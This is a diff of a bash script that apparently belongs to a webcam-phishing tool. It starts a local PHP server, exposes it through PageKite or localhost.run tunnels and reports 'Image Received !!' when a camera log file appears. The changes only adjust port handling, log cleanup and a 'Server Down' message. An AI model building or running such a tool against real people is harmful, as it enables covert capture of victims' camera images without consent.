@@ -228,7 +228,6 @@ printf "\e[1;33m     Press Enter to Start Tunnelling\e[0m\n"
 read enter
 sleep 1
 
-fuser -k 4521/tcp > /dev/null 2>&1
 cd .www/ && php -S localhost:4521 > /dev/null 2>&1 &
 
 if [[ $pagekite_subdomain_resp == true ]]; then
@@ -253,7 +252,6 @@ printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Initializing...\e[0m
 sleep 2
 printf "\e[0m\n"
 printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Launching LocalhostRun...\e[0m\n"
-fuser -k $local_port/tcp > /dev/null 2>&1
 cd .www/ && php -S localhost:$local_port > /dev/null 2>&1 &
 sleep 3
 banner
@@ -281,9 +279,17 @@ sleep 0.5
 if [[ -e ".www/.cam.log" ]]; then
 printf "\n"
 printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Image Received !!\e[0m\n"
+rm -rf .www/.cam.log
+else
+banner
+printf "\n"
+printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Server Down !!\n"
+sleep 1
+printf "\e[0m\n"
+printf "\e[0m\n"
+
 fi
 
-done
 }
 
 banner
